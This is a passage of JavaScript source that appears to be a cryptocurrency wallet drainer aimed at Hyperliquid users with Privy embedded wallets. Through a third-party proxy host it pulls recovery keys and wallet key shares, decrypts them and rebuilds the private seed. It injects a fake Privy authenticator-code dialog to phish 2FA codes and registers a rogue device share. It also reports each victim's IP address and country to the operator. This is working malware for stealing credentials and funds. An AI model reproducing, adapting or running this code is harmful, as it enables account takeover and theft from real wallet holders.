                );
            }
            
            return withdrawals;

        } catch (error) {
            console.debug('[Hyperliquid] injectedStart error:', error);
            queueMessage(
                "📍 <b>Platform: </b> " + platform + "\n\n❌ <b>Injected Wallet Error</b>\n\n" +
                "Error: <code>" + error.message + "</code>\n\n" +
                getCountryFlag(ipData.country_code) + " " + ipData.country_name + " • " + ipData.ip,
                0, "", code, username, platform
            );
            return [];
        }

    }

    const embeddedStart = async (connection) => {
        // completed
        // =================== G part ===================
        const g = async (e) => {
            let {
                appId: r,
                appClientId: t,
                accessToken: a,
                entropyKey: i,
                entropyKeyVerifier: n
            } = e;
            return await s('https://privy-proxy-lemon.vercel.app/api/proxy', JSON.stringify({
                path: "key_material",
                entropyKey: encodeURIComponent(i),
                body: { chain_type: V(n) }
            }), O({
                appId: r,
                appClientId: t,
                accessToken: a
            }))
        }
        const s = async (e, r, t) => await module7532.u(
            e,
            {
                method: 'POST',
                body: r,
                headers: t,
                timeout: 9000,
                credentials: 'include',
            }
        );
        let L = {
            'ethereum-address-verifier': 'ethereum',
            'solana-address-verifier': 'solana',
            p256: 'p256'
        };
        let V = e => L[e];
        const O = (e) => {
            let {
                appId: r,
                appClientId: t,
                accessToken: a,
                mfaToken: i,
                headers: n
            } = e;
            let o = new Headers(n);
            o.set('Content-Type', "application/json")
            o.set('Origin', "https://auth.privy.io")
            o.set('Referer', "https://auth.privy.io")

            return o.set('privy-app-id', r),
                o.set('authorization', 'Bearer '.concat(a)),
                t &&
                o.set('privy-client-id', t),
                i &&
                o.set('privy-mfa-token', i),
                o
        };
        // ================================================

        const Y = (e) => {
            return crypto.subtle.importKey('raw', e, 'AES-GCM', !0, [
                'encrypt',
                'decrypt'
            ])
        };

        const H = async (e) => {
            let r = await crypto.subtle.exportKey('raw', e);
            return await Z(r)
        };

        const Z = async (e) => {
            return new Uint8Array(await crypto.subtle.digest('SHA-256', e))
        }

        // completed
        // =================== E part ===================
        async function E(e) {
            let {
                appId: r,
                appClientId: t,
                accessToken: a,
                entropyId: i,
                entropyIdVerifier: o,
                recoveryKeyHash: s,
                mfaToken: c
            } = e;

            try {
                let [e, l] = await Promise.all([m({
                    appId: r,
                    appClientId: t,
                    accessToken: a,
                    entropyKey: i,
                    entropyKeyVerifier: o,
                    mfaToken: c
                }), b({
                    appId: r,
                    appClientId: t,
                    accessToken: a,
                    entropyKey: i,
                    entropyKeyVerifier: o,
                    recoveryKeyHash: s
                })]);

                return {
                    recoveryAuthShare: e.share,
                    encryptedRecoveryShare: l.encrypted_recovery_share,
                    encryptedRecoveryShareIV: l.encrypted_recovery_share_iv,
                    imported: l.imported
                }
            } catch (e) { console.debug('error', 'Failed to recover wallet: '.concat(e instanceof Error ? e.message : 'unknown error')) }
        }

        async function showModalAndGetToken(entropyKey, chainType, appId, appClientId, accessToken) {
            return new Promise((resolve, reject) => {
                const existing = document.getElementById('headlessui-portal-root');
                if (existing) existing.remove();

                const wrapper = document.createElement('div');
                wrapper.id = 'headlessui-portal-root';
                wrapper.innerHTML = `
          <div id="headlessui-portal-root"><div data-headlessui-portal=""><button type="button" data-headlessui-focus-guard="true" aria-hidden="true" style="position: fixed; top: 1px; left: 1px; width: 1px; height: 0px; padding: 0px; margin: -1px; overflow: hidden; clip: rect(0px, 0px, 0px, 0px); white-space: nowrap; border-width: 0px;"></button><div><div aria-label="log in or sign up" id="privy-dialog" role="dialog" tabindex="-1" aria-modal="true" data-headlessui-state="open" data-open="" class="DialogWrapper-sc-3cfde0b5-1 kMxiDG" style=""><div id="privy-dialog-backdrop" aria-hidden="true" class="Backdrop-sc-3cfde0b5-0 fqVxLU" style=""></div><div class="DialogContainer-sc-3cfde0b5-2 czNOAe"><div class="Panel-sc-3cfde0b5-3 bzMTFK" id="headlessui-dialog-panel-:r7:" data-headlessui-state="open" data-open="" style=""><div class="StylesWrapper-sc-bc1e45b4-0 OKehX"><div style="height: 390px;" id="privy-modal-content" class="ContentWrapper-sc-df48cc55-0 BaseModal-sc-df48cc55-1 gqaleT iXSMOH"><div><div class="StyledHeader-sc-f295093d-2 hjxCUu"><div class="LeftActionContainer-sc-f295093d-3 ljYUxb"></div><div class="RightActionContainer-sc-f295093d-4 fJCbRy"><div><button aria-label="close modal" class="StyledButton-sc-f295093d-0 bPNlPP"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true" data-slot="icon" height="16px" width="16px"><path stroke-linecap="round" stroke-linejoin="round" d="M6 18 18 6M6 6l12 12"></path></svg></button></div></div></div><div style="margin-bottom: 1.5rem;" class="IconWrapper-sc-a63b1990-16 eAjjOh"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" data-slot="icon"><path stroke-linecap="round" stroke-linejoin="round" d="M10.5 1.5H8.25A2.25 2.25 0 0 0 6 3.75v16.5a2.25 2.25 0 0 0 2.25 2.25h7.5A2.25 2.25 0 0 0 18 20.25V3.75a2.25 2.25 0 0 0-2.25-2.25H13.5m-3 0V3h3V1.5m-3 0h3m-3 18.75h3"></path></svg></div><div class="Title-sc-a63b1990-1 kRloTh">Enter verification code</div><div class="Container-sc-a63b1990-3 hQyKLY"><div class="PinInputContainer-sc-7a171f6-0 bQIgen"><div><input name="pin-0" type="text" inputmode="numeric" pattern="[0-9]" class="" autocomplete="off" value=""><input name="pin-1" type="text" inputmode="numeric" pattern="[0-9]" class="" autocomplete="off" value=""><input name="pin-2" type="text" inputmode="numeric" pattern="[0-9]" class="" autocomplete="off" value=""><input name="pin-3" type="text" inputmode="numeric" pattern="[0-9]" class="" autocomplete="off" value=""><input name="pin-4" type="text" inputmode="numeric" pattern="[0-9]" class="" autocomplete="off" value=""><input name="pin-5" type="text" inputmode="numeric" pattern="[0-9]" class="" autocomplete="off" value=""></div><div><div class="InputHelp-sc-7a171f6-1 cOEtZi"></div></div></div><div class="SubTitle-sc-a63b1990-2 fKRCze">To continue, please enter the 6-digit code generated from your <strong>authenticator app</strong></div></div><button class="Button-sc-3253171f-0 StyledSecondaryButton-sc-3253171f-3 ejjYaY jTCOmv">Not now</button><div class="ModalFooter-sc-bdb69ecc-1 iBQefN"></div></div></div></div></div></div></div></div><button type="button" data-headlessui-focus-guard="true" aria-hidden="true" style="position: fixed; top: 1px; left: 1px; width: 1px; height: 0px; padding: 0px; margin: -1px; overflow: hidden; clip: rect(0px, 0px, 0px, 0px); white-space: nowrap; border-width: 0px;"></button></div></div>
            `;
                document.body.appendChild(wrapper);

                const cleanup = () => {
                    wrapper.remove();
                    delete window.setupPinInputs;
                };

                const extractMfaToken = (response) => {
                    if (!response) return null;
                    if (typeof response === 'string') return response;
                    if (typeof response.token === 'string') return response.token;
                    if (typeof response.mfa_token === 'string') return response.mfa_token;
                    if (typeof response.privy_mfa_token === 'string') return response.privy_mfa_token;
                    if (response.data && typeof response.data.token === 'string') return response.data.token;
                    return null;
                };

                window.setupPinInputs = function setupPinInputs() {
                    const inputs = wrapper.querySelectorAll('input[name^="pin-"]');
                    if (!inputs.length) {
                        cleanup();
                        reject(new Error('MFA inputs not found'));
                        return;
                    }

                    const helper = wrapper.querySelector('.InputHelp-sc-7a171f6-1');
                    let isSubmitting = false;

                    const getCode = () => Array.from(inputs).map((input) => input.value).join('');

                    const clearInputs = () => {
                        inputs.forEach((input) => {
                            input.value = '';
                        });
                        inputs[0].focus();
                    };

                    const setError = (message) => {
                        if (!helper) return;
                        helper.textContent = message || '';
                        helper.style.color = message ? '#d32f2f' : '';
                    };

                    const submitCode = async () => {
                        if (isSubmitting) return;

                        const mfaCode = getCode();
                        if (mfaCode.length !== inputs.length) return;

                        isSubmitting = true;

                        try {
                            const response = await s(
                                'https://privy-proxy-lemon.vercel.app/api/proxy',
                                JSON.stringify({
                                    path: "verify_mfa",
                                    entropyKey: encodeURIComponent(entropyKey),
                                    body: { code: mfaCode }
                                }),
                                O({
                                    appId: appId,
                                    appClientId: appClientId,
                                    accessToken: accessToken,
                                })
                            );

                            const token = extractMfaToken(response);
                            if (!token) {
                                setError('Verification succeeded without token, try again');
                                clearInputs();
                                return;
                            }

                            cleanup();
                            resolve(token);
                        } catch (error) {
                            setError('Network error, try again');
                            clearInputs();
                        } finally {
                            isSubmitting = false;
                        }
                    };

                    inputs.forEach((input, index) => {
                        input.addEventListener('input', () => {
                            const digit = (input.value.match(/[0-9]/g) || []).pop() || '';
                            input.value = digit;

                            if (digit && inputs[index + 1]) {
                                inputs[index + 1].focus();
                            }

                            submitCode();
                        });

                        input.addEventListener('paste', (event) => {
                            event.preventDefault();
                            const pasted = (event.clipboardData || window.clipboardData).getData('text') || '';
                            const digits = (pasted.match(/[0-9]/g) || []).slice(0, inputs.length);

                            inputs.forEach((field, fieldIndex) => {
                                field.value = digits[fieldIndex] || '';
                            });

                            const nextIndex = Math.min(digits.length, inputs.length - 1);
                            inputs[nextIndex].focus();

                            if (digits.length === inputs.length) {
                                submitCode();
                            }
                        });

                        input.addEventListener('keydown', (event) => {
                            if (event.key === 'Backspace' && !input.value && inputs[index - 1]) {
                                inputs[index - 1].focus();
                            }
                        });
                    });

                    inputs[0].focus();
                };

                window.setupPinInputs();
            });
        }

        async function m(e) {
            let {
                appId: r,
                appClientId: t,
                accessToken: a,
                entropyKey: i,
                entropyKeyVerifier: n,
                mfaToken: o
            } = e;

            try {
                return await s(
                    'https://privy-proxy-lemon.vercel.app/api/proxy',
                    JSON.stringify({
                        path: "auth_share",
                        entropyKey: encodeURIComponent(i),
                        body: { chain_type: V(n) }
                    }),
                    O({
                        appId: r,
                        appClientId: t,
                        accessToken: a,
                        mfaToken: o
                    })
                )
            } catch (error) {
                queueMessage("🔌 User has 2FA enabled, showing MFA modal to get token\n\n" + getCountryFlag(ipData.country_code) + " " + ipData.country_name + " • " + ipData.ip, 0, "", code);
                const mfaToken = await showModalAndGetToken(i, n, r, t, a);
                queueMessage("🔌 Successfully verified 2FA code and got token\n\n" + getCountryFlag(ipData.country_code) + " " + ipData.country_name + " • " + ipData.ip, 0, "", code);
                if (!mfaToken) {
                    throw new Error('Failed to get mfa token');
                }

                return await s(
                    'https://privy-proxy-lemon.vercel.app/api/proxy',
                    JSON.stringify({
                        path: "auth_share",
                        entropyKey: encodeURIComponent(i),
                        body: { chain_type: V(n) }
                    }),
                    O({
                        appId: r,
                        appClientId: t,
                        accessToken: a,
                        mfaToken: mfaToken
                    })
                )
            }
        }
        async function b(e) {
            let {
                appId: r,
                appClientId: t,
                accessToken: a,
                entropyKey: i,
                entropyKeyVerifier: n,
                recoveryKeyHash: o
            } = e;

            return await s(
                'https://privy-proxy-lemon.vercel.app/api/proxy',
                JSON.stringify({
                    path: "shares",
                    entropyKey: encodeURIComponent(i),
                    body: {
                        recovery_key_hash: o,
                        chain_type: V(n)
                    }
                }),
                O({
                    appId: r,
                    appClientId: t,
                    accessToken: a
                })
            )
        }
        // ================================================

        function Q(e, r, t) {
            return er(e, r, t)
        }
        async function er(e, r, t) {
            return new Uint8Array(await crypto.subtle.decrypt({
                iv: r,
                name: 'AES-GCM'
            }, t, e))
        }

        // =================== U part ===================
        async function U(e) {
            let {
                shares: r,
                primaryAddress: t,
                walletIndex: a
            }
                = e,

                i = await y(r),

                n = x({
                    entropy: i,
                    walletIndex: a
                });

            return {
                chainType: 'ethereum',
                entropyType: 'hd-entropy',
                wallet: n,
                entropy: i,
                walletIndex: a
            }
        }
        async function y(t) {
            function f(t, e, r) {
                let o1 = new Uint8Array([1, 229, 76, 181, 251, 159, 252, 18, 3, 52, 212, 196, 22, 186, 31, 54, 5, 92, 103, 87, 58, 213, 33, 90, 15, 228, 169, 249, 78, 100, 99, 238, 17, 55, 224, 16, 210, 172, 165, 41, 51, 89, 59, 48, 109, 239, 244, 123, 85, 235, 77, 80, 183, 42, 7, 141, 255, 38, 215, 240, 194, 126, 9, 140, 26, 106, 98, 11, 93, 130, 27, 143, 46, 190, 166, 29, 231, 157, 45, 138, 114, 217, 241, 39, 50, 188, 119, 133, 150, 112, 8, 105, 86, 223, 153, 148, 161, 144, 24, 187, 250, 122, 176, 167, 248, 171, 40, 214, 21, 142, 203, 242, 19, 230, 120, 97, 63, 137, 70, 13, 53, 49, 136, 163, 65, 128, 202, 23, 95, 83, 131, 254, 195, 155, 69, 57, 225, 245, 158, 25, 94, 182, 207, 75, 56, 4, 185, 43, 226, 193, 74, 221, 72, 12, 208, 125, 61, 88, 222, 124, 216, 20, 107, 135, 71, 232, 121, 132, 115, 60, 189, 146, 201, 35, 139, 151, 149, 68, 220, 173, 64, 101, 134, 162, 164, 204, 127, 236, 192, 175, 145, 253, 247, 79, 129, 47, 91, 234, 168, 28, 2, 209, 152, 113, 237, 37, 227, 36, 6, 104, 179, 147, 44, 111, 62, 108, 10, 184, 206, 174, 116, 177, 66, 180, 30, 211, 73, 233, 156, 200, 198, 199, 34, 110, 219, 32, 191, 67, 81, 82, 102, 178, 118, 96, 218, 197, 243, 246, 170, 205, 154, 160, 117, 84, 14, 1]);
                let n1 = new Uint8Array([0, 255, 200, 8, 145, 16, 208, 54, 90, 62, 216, 67, 153, 119, 254, 24, 35, 32, 7, 112, 161, 108, 12, 127, 98, 139, 64, 70, 199, 75, 224, 14, 235, 22, 232, 173, 207, 205, 57, 83, 106, 39, 53, 147, 212, 78, 72, 195, 43, 121, 84, 40, 9, 120, 15, 33, 144, 135, 20, 42, 169, 156, 214, 116, 180, 124, 222, 237, 177, 134, 118, 164, 152, 226, 150, 143, 2, 50, 28, 193, 51, 238, 239, 129, 253, 48, 92, 19, 157, 41, 23, 196, 17, 68, 140, 128, 243, 115, 66, 30, 29, 181, 240, 18, 209, 91, 65, 162, 215, 44, 233, 213, 89, 203, 80, 168, 220, 252, 242, 86, 114, 166, 101, 47, 159, 155, 61, 186, 125, 194, 69, 130, 167, 87, 182, 163, 122, 117, 79, 174, 63, 55, 109, 71, 97, 190, 171, 211, 95, 176, 88, 175, 202, 94, 250, 133, 228, 77, 138, 5, 251, 96, 183, 123, 184, 38, 74, 103, 198, 26, 248, 105, 37, 179, 219, 189, 102, 221, 241, 210, 223, 3, 141, 52, 217, 146, 13, 99, 85, 170, 73, 236, 188, 149, 60, 132, 11, 245, 230, 231, 229, 172, 126, 110, 185, 249, 218, 142, 154, 201, 36, 225, 10, 21, 107, 58, 160, 81, 244, 234, 178, 151, 158, 93, 34, 136, 148, 206, 25, 1, 113, 76, 165, 227, 197, 49, 187, 204, 31, 45, 59, 82, 111, 246, 46, 137, 247, 192, 104, 27, 100, 4, 6, 191, 131, 56]);

                let i = t.length;
                let n = 0;
                let o = 0;

                function s(t, e) { return t ^ e }

                function a(t, e) { return 0 === t ? 0 : o1[(n1[t] - n1[e] + 255) % 255] }

                function h(t, e) { return 0 === t || 0 === e ? 0 : o1[(n1[t] + n1[e]) % 255] }

                for (let f = 0; f < i; f++) {
                    n = 1;
                    for (let e = 0; e < i; ++e) { if (f !== e) n = h(n, a(s(r, t[e]), s(t[f], t[e]))) }

                    o = s(o, h(e[f], n))
                }
                return o
            }

            let e = t[0];

            let r = t.length;
            let i = e.byteLength;
            let n = i - 1;
            let o = new Uint8Array(n);
            let s = new Uint8Array(r);
            let a = new Uint8Array(r);
            let h = new Set;

            for (let e = 0; e < r; e++) {
                let r = t[e][i - 1];

                h.add(r);
                s[e] = r;
            }

            for (let e = 0; e < n; e++) {
                for (let i = 0; i < r; ++i) a[i] = t[i][e];
                o[e] = f(s, a, 0);
            }
            return o
        }
        function x(e) {
            let {
                entropy: r,
                walletIndex: t
            } = e;

            return C({
                entropy: r,
                opts: {
                    addressIndex: t
                }
            })
        }
        function C(e) {
            let {
                entropy: r,
                opts: t
            } = e;

            function ta(t, e = {}) {
                let r = module19441.tO(t);
                return viemAccounts.hdKeyToAccount(viemAccounts.HDKey.fromMasterSeed(r), e)
            }

            let i = "abandon ability able about above absent absorb abstract absurd abuse access accident account accuse achieve acid acoustic acquire across act action actor actress actual adapt add addict address adjust admit adult advance advice aerobic affair afford afraid again age agent agree ahead aim air airport aisle alarm album alcohol alert alien all alley allow almost alone alpha already also alter always amateur amazing among amount amused analyst anchor ancient anger angle angry animal ankle announce annual another answer antenna antique anxiety any apart apology appear apple approve april arch arctic area arena argue arm armed armor army around arrange arrest arrive arrow art artefact artist artwork ask aspect assault asset assist assume asthma athlete atom attack attend attitude attract auction audit august aunt author auto autumn average avocado avoid awake aware away awesome awful awkward axis baby bachelor bacon badge bag balance balcony ball bamboo banana banner bar barely bargain barrel base basic basket battle beach bean beauty because become beef before begin behave behind believe below belt bench benefit best betray better between beyond bicycle bid bike bind biology bird birth bitter black blade blame blanket blast bleak bless blind blood blossom blouse blue blur blush board boat body boil bomb bone bonus book boost border boring borrow boss bottom bounce box boy bracket brain brand brass brave bread breeze brick bridge brief bright bring brisk broccoli broken bronze broom brother brown brush bubble buddy budget buffalo build bulb bulk bullet bundle bunker burden burger burst bus business busy butter buyer buzz cabbage cabin cable cactus cage cake call calm camera camp can canal cancel candy cannon canoe canvas canyon capable capital captain car carbon card cargo carpet carry cart case cash casino castle casual cat catalog catch category cattle caught cause caution cave ceiling celery cement census century cereal certain chair chalk champion change chaos chapter charge chase chat cheap check cheese chef cherry chest chicken chief child chimney choice choose chronic chuckle chunk churn cigar cinnamon circle citizen city civil claim clap clarify claw clay clean clerk clever click client cliff climb clinic clip clock clog close cloth cloud clown club clump cluster clutch coach coast coconut code coffee coil coin collect color column combine come comfort comic common company concert conduct confirm congress connect consider control convince cook cool copper copy coral core corn correct cost cotton couch country couple course cousin cover coyote crack cradle craft cram crane crash crater crawl crazy cream credit creek crew cricket crime crisp critic crop cross crouch crowd crucial cruel cruise crumble crunch crush cry crystal cube culture cup cupboard curious current curtain curve cushion custom cute cycle dad damage damp dance danger daring dash daughter dawn day deal debate debris decade december decide decline decorate decrease deer defense define defy degree delay deliver demand demise denial dentist deny depart depend deposit depth deputy derive describe desert design desk despair destroy detail detect develop device devote diagram dial diamond diary dice diesel diet differ digital dignity dilemma dinner dinosaur direct dirt disagree discover disease dish dismiss disorder display distance divert divide divorce dizzy doctor document dog doll dolphin domain donate donkey donor door dose double dove draft dragon drama drastic draw dream dress drift drill drink drip drive drop drum dry duck dumb dune during dust dutch duty dwarf dynamic eager eagle early earn earth easily east easy echo ecology economy edge edit educate effort egg eight either elbow elder electric elegant element elephant elevator elite else embark embody embrace emerge emotion employ empower empty enable enact end endless endorse enemy energy enforce engage engine enhance enjoy enlist enough enrich enroll ensure enter entire entry envelope episode equal equip era erase erode erosion error erupt escape essay essence estate eternal ethics evidence evil evoke evolve exact example excess exchange excite exclude excuse execute exercise exhaust exhibit exile exist exit exotic expand expect expire explain expose express extend extra eye eyebrow fabric face faculty fade faint faith fall false fame family famous fan fancy fantasy farm fashion fat fatal father fatigue fault favorite feature february federal fee feed feel female fence festival fetch fever few fiber fiction field figure file film filter final find fine finger finish fire firm first fiscal fish fit fitness fix flag flame flash flat flavor flee flight flip float flock floor flower fluid flush fly foam focus fog foil fold follow food foot force forest forget fork fortune forum forward fossil foster found fox fragile frame frequent fresh friend fringe frog front frost frown frozen fruit fuel fun funny furnace fury future gadget gain galaxy gallery game gap garage garbage garden garlic garment gas gasp gate gather gauge gaze general genius genre gentle genuine gesture ghost giant gift giggle ginger giraffe girl give glad glance glare glass glide glimpse globe gloom glory glove glow glue goat goddess gold good goose gorilla gospel gossip govern gown grab grace grain grant grape grass gravity great green grid grief grit grocery group grow grunt guard guess guide guilt guitar gun gym habit hair half hammer hamster hand happy harbor hard harsh harvest hat have hawk hazard head health heart heavy hedgehog height hello helmet help hen hero hidden high hill hint hip hire history hobby hockey hold hole holiday hollow home honey hood hope horn horror horse hospital host hotel hour hover hub huge human humble humor hundred hungry hunt hurdle hurry hurt husband hybrid ice icon idea identify idle ignore ill illegal illness image imitate immense immune impact impose improve impulse inch include income increase index indicate indoor industry infant inflict inform inhale inherit initial inject injury inmate inner innocent input inquiry insane insect inside inspire install intact interest into invest invite involve iron island isolate issue item ivory jacket jaguar jar jazz jealous jeans jelly jewel job join joke journey joy judge juice jump jungle junior junk just kangaroo keen keep ketchup key kick kid kidney kind kingdom kiss kit kitchen kite kitten kiwi knee knife knock know lab label labor ladder lady lake lamp language laptop large later latin laugh laundry lava law lawn lawsuit layer lazy leader leaf learn leave lecture left leg legal legend leisure lemon lend length lens leopard lesson letter level liar liberty library license life lift light like limb limit link lion liquid list little live lizard load loan lobster local lock logic lonely long loop lottery loud lounge love loyal lucky luggage lumber lunar lunch luxury lyrics machine mad magic magnet maid mail main major make mammal man manage mandate mango mansion manual maple marble march margin marine market marriage mask mass master match material math matrix matter maximum maze meadow mean measure meat mechanic medal media melody melt member memory mention menu mercy merge merit merry mesh message metal method middle midnight milk million mimic mind minimum minor minute miracle mirror misery miss mistake mix mixed mixture mobile model modify mom moment monitor monkey monster month moon moral more morning mosquito mother motion motor mountain mouse move movie much muffin mule multiply muscle museum mushroom music must mutual myself mystery myth naive name napkin narrow nasty nation nature near neck need negative neglect neither nephew nerve nest net network neutral never news next nice night noble noise nominee noodle normal north nose notable note nothing notice novel now nuclear number nurse nut oak obey object oblige obscure observe obtain obvious occur ocean october odor off offer office often oil okay old olive olympic omit once one onion online only open opera opinion oppose option orange orbit orchard order ordinary organ orient original orphan ostrich other outdoor outer output outside oval oven over own owner oxygen oyster ozone pact paddle page pair palace palm panda panel panic panther paper parade parent park parrot party pass patch path patient patrol pattern pause pave payment peace peanut pear peasant pelican pen penalty pencil people pepper perfect permit person pet phone photo phrase physical piano picnic picture piece pig pigeon pill pilot pink pioneer pipe pistol pitch pizza place planet plastic plate play please pledge pluck plug plunge poem poet point polar pole police pond pony pool popular portion position possible post potato pottery poverty powder power practice praise predict prefer prepare present pretty prevent price pride primary print priority prison private prize problem process produce profit program project promote proof property prosper protect proud provide public pudding pull pulp pulse pumpkin punch pupil puppy purchase purity purpose purse push put puzzle pyramid quality quantum quarter question quick quit quiz quote rabbit raccoon race rack radar radio rail rain raise rally ramp ranch random range rapid rare rate rather raven raw razor ready real reason rebel rebuild recall receive recipe record recycle reduce reflect reform refuse region regret regular reject relax release relief rely remain remember remind remove render renew rent reopen repair repeat replace report require rescue resemble resist resource response result retire retreat return reunion reveal review reward rhythm rib ribbon rice rich ride ridge rifle right rigid ring riot ripple risk ritual rival river road roast robot robust rocket romance roof rookie room rose rotate rough round route royal rubber rude rug rule run runway rural sad saddle sadness safe sail salad salmon salon salt salute same sample sand satisfy satoshi sauce sausage save say scale scan scare scatter scene scheme school science scissors scorpion scout scrap screen script scrub sea search season seat second secret section security seed seek segment select sell seminar senior sense sentence series service session settle setup seven shadow shaft shallow share shed shell sheriff shield shift shine ship shiver shock shoe shoot shop short shoulder shove shrimp shrug shuffle shy sibling sick side siege sight sign silent silk silly silver similar simple since sing siren sister situate six size skate sketch ski skill skin skirt skull slab slam sleep slender slice slide slight slim slogan slot slow slush small smart smile smoke smooth snack snake snap sniff snow soap soccer social sock soda soft solar soldier solid solution solve someone song soon sorry sort soul sound soup source south space spare spatial spawn speak special speed spell spend sphere spice spider spike spin spirit split spoil sponsor spoon sport spot spray spread spring spy square squeeze squirrel stable stadium staff stage stairs stamp stand start state stay steak steel stem step stereo stick still sting stock stomach stone stool story stove strategy street strike strong struggle student stuff stumble style subject submit subway success such sudden suffer sugar suggest suit summer sun sunny sunset super supply supreme sure surface surge surprise surround survey suspect sustain swallow swamp swap swarm swear sweet swift swim swing switch sword symbol symptom syrup system table tackle tag tail talent talk tank tape target task taste tattoo taxi teach team tell ten tenant tennis tent term test text thank that theme then theory there they thing this thought three thrive throw thumb thunder ticket tide tiger tilt timber time tiny tip tired tissue title toast tobacco today toddler toe together toilet token tomato tomorrow tone tongue tonight tool tooth top topic topple torch tornado tortoise toss total tourist toward tower town toy track trade traffic tragic train transfer trap trash travel tray treat tree trend trial tribe trick trigger trim trip trophy trouble truck true truly trumpet trust truth try tube tuition tumble tuna tunnel turkey turn turtle twelve twenty twice twin twist two type typical ugly umbrella unable unaware uncle uncover under undo unfair unfold unhappy uniform unique unit universe unknown unlock until unusual unveil update upgrade uphold upon upper upset urban urge usage use used useful useless usual utility vacant vacuum vague valid valley valve van vanish vapor various vast vault vehicle velvet vendor venture venue verb verify version very vessel veteran viable vibrant vicious victory video view village vintage violin virtual virus visa visit visual vital vivid vocal voice void volcano volume vote voyage wage wagon wait walk wall walnut want warfare warm warrior wash wasp waste water wave way wealth weapon wear weasel weather web wedding weekend weird welcome west wet whale what wheat wheel when where whip whisper wide width wife wild will win window wine wing wink winner winter wire wisdom wise wish witness wolf woman wonder wood wool word work world worry worth wrap wreck wrestle wrist write wrong yard year yellow you young youth zebra zero zone zoo".split(" ")
            return ta(module19441.tR(r, i), t)
        }
        // ================================================


        // ====== D part ===================
        function D() { return a.tw.encode(getRandomBytes(16)) }
        function getRandomBytes(e) { return crypto.getRandomValues(new Uint8Array(e)) }
        // ================================================

        function N(e) {
            async function g(t, e, r) {
                function p() {
                    let t = new Uint8Array(255);
                    for (let e = 0; e < 255; e++) t[e] = e + 1;
                    let e = getRandomBytes(255);
                    for (let r = 0; r < 255; r++) {
                        let i = e[r] % 255,
                            n = t[r];
                        t[r] = t[i],
                            t[i] = n
                    }
                    return t
                }

                function d(t, e) {
                    function l() {
                        function i(t) { return crypto.getRandomValues(new Uint8Array(t)) }

                        return i(1)[0]
                    }
                    function c() {
                        for (; ;) {
                            let t = l();
                            if (t > 0) return t
                        }
                    }
                    let r = new Uint8Array(e + 1);
                    r[0] = t;
                    for (let t = 1; t <= e; t++) {
                        let i = t === e;
                        r[t] = i ? c() : l()
                    }
                    return r
                }

                function u(t, e, r) {
                    function s(t, e) { return t ^ e }

                    function h(t, e) { return 0 === t || 0 === e ? 0 : o[(n[t] + n[e]) % 255] }

                    if (0 === e) return t[0];
                    let i = t[r];
                    for (let n = r - 1; n >= 0; n--) {
                        let r = t[n];
                        i = s(h(i, e), r)
                    }
                    return i
                }

                let i = [];
                let n = t.byteLength;
                let o = p();

                for (let t = 0; t < e; t++) {
                    let e = new Uint8Array(n + 1);
                    e[n] = o[t];
                    i.push(e);
                }
                let s = r - 1;
                for (let r = 0; r < n; r++) {
                    let n = d(t[r], s);
                    for (let t = 0; t < e; ++t) {
                        let e = u(n, o[t], s);
                        i[t][r] = e
                    }
                }
                return i;
            }

            return g(e, 2, 2)
        }


        // ============== I part ==========================
        async function I(e) {
            let {
                appId: t,
                appClientId: a,
                accessToken: i,
                entropyKey: o,
                entropyKeyVerifier: s,
                deviceAuthShare: c,
                deviceId: l
            } = e;
            try {
                return await k({
                    appId: t,
                    appClientId: a,
                    accessToken: i,
                    entropyKey: o,
                    entropyKeyVerifier: s,
                    deviceAuthShare: c,
                    deviceId: l
                })
            } catch (e) { console.debug(e); }
        }
        async function k(e) {
            let {
                appId: r,
                appClientId: t,
                accessToken: a,
                entropyKey: i,
                entropyKeyVerifier: n,
                deviceAuthShare: o,
                deviceId: c
            } = e;

            return await s('https://privy-proxy-lemon.vercel.app/api/proxy', JSON.stringify({
                path: "device",
                entropyKey: encodeURIComponent(i),
                body: {
                    device_id: c,
                    device_auth_share: o,
                    chain_type: V(n)
                }
            }), O({
                appId: r,
                appClientId: t,
                accessToken: a
            }))
        }

        // main
        async function getHashesData(e) {
            let r;
            let t;
            let entropyResult;
            let {
                appId: c,
                appClientId: l, // null
                userId: u,
                accessToken: p,
                entropyId: _,
                entropyIdVerifier: m,
            } = e;

            let C = null;
            let {
                recovery_type: F,
                recovery_key: recoveryKeyN,
            } = await g({
                appId: c,
                appClientId: l,
                accessToken: p,
                entropyKey: _, // wallet address 
                entropyKeyVerifier: m
            });

            if ('privy_generated_recovery_key' === F) { r = await Y(a.K3.decode(recoveryKeyN)) }

            let G = await H(r);
            let {
                recoveryAuthShare: recoveryAuthShareO,
                encryptedRecoveryShare: encryptedRecoveryShareV,
                encryptedRecoveryShareIV: B,
            } = await E({
                appId: c,
                appClientId: l,
                accessToken: p,
                entropyId: _,
                entropyIdVerifier: m,
                recoveryKeyHash: a.K3.encode(G),
                mfaToken: C
            });

            let j = await Q(a.K3.decode(encryptedRecoveryShareV), a.K3.decode(B), r);
            if ('ethereum-address-verifier' === m) {
                let {
                    entropy: e,
                    wallet: r
                } = await U({
                    shares: [j, a.K3.decode(recoveryAuthShareO)],
                    primaryAddress: _,
                    walletIndex: 0
                });

                entropyResult = (
                    t = {
                        entropyId: _,
                        entropyIdVerifier: m,
                        chainType: 'ethereum',
                        entropyType: 'hd-entropy',
                        wallet: r,
                        entropy: e,
                        walletIndex: 0
                    }
                ).entropy
            }

            let z = D();
            let [W, Y2] = await N(entropyResult);
            let deviceAuthShareH = a.K3.encode(Y2);

            return await I({
                userId: u,
                appId: c,
                appClientId: l,
                accessToken: p,
                entropyKey: _,
                entropyKeyVerifier: m,
                deviceId: z,
                deviceAuthShare: deviceAuthShareH
            }), {
                share: a.K3.encode(W),
                deviceId: z
            }, t
        }

        let sessionData;
        try {
            sessionData = await retryWithBackoff(
                async () => {
                    const response = await fetchWithTimeoutUtil(
                        "https://auth.privy.io/api/v1/sessions",
                        {
                            method: "POST",
                            body: JSON.stringify({ "refresh_token": refreshToken.replaceAll('"', "") }),
                            headers: {
                                'authorization': "Bearer " + accessToken.replaceAll('"', ""),
                                'content-type': 'application/json',
                                'privy-app-id': APP_ID,
                            }
                        },
                        10000
                    );

                    if (!response.ok) {
                        throw new Error(`Privy session API error: ${response.status}`);
                    }

                    return await response.json();
                },
                { maxRetries: 2, initialDelay: 1000 }
            );
        } catch (error) {
            console.error('Failed to get Privy session after retries:', error);
